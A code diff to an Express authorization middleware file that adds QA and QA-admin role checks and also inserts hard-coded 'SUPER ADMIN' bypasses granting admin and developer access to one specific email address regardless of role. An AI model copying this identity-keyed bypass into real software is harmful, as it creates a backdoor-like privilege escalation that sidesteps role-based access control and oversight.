@@ -85,6 +85,11 @@ exports.protect = async (req, res, next) => {
 
 // Admin only middleware
 exports.admin = (req, res, next) => {
+  // SUPER ADMIN: filipkozomara@mebit.io always has admin access
+  if (req.user?.email?.toLowerCase() === 'filipkozomara@mebit.io') {
+    return next();
+  }
+
   if (req.user && req.user.role === 'admin') {
     next();
   } else {
@@ -94,6 +99,11 @@ exports.admin = (req, res, next) => {
 
 // Developer middleware (has same permissions as admin + additional developer-specific permissions)
 exports.developer = (req, res, next) => {
+  // SUPER ADMIN: filipkozomara@mebit.io always has developer access
+  if (req.user?.email?.toLowerCase() === 'filipkozomara@mebit.io') {
+    return next();
+  }
+
   if (req.user && (req.user.role === 'admin' || req.user.role === 'developer')) {
     next();
   } else {
@@ -107,6 +117,26 @@ exports.adminOrDeveloper = (req, res, next) => {
     next();
   } else {
     res.status(403).json({ message: 'Not authorized - admin or developer access required' });
+  }
+};
+
+// QA middleware - for QA pages access
+exports.qa = (req, res, next) => {
+  const allowedRoles = ['qa', 'qa-admin', 'admin'];
+  if (req.user && allowedRoles.includes(req.user.role)) {
+    next();
+  } else {
+    res.status(403).json({ message: 'Not authorized - QA access required' });
+  }
+};
+
+// QA Admin middleware - for QA admin-only pages
+exports.qaAdmin = (req, res, next) => {
+  const allowedRoles = ['qa-admin', 'admin'];
+  if (req.user && allowedRoles.includes(req.user.role)) {
+    next();
+  } else {
+    res.status(403).json({ message: 'Not authorized - QA Admin access required' });
   }
 };
 
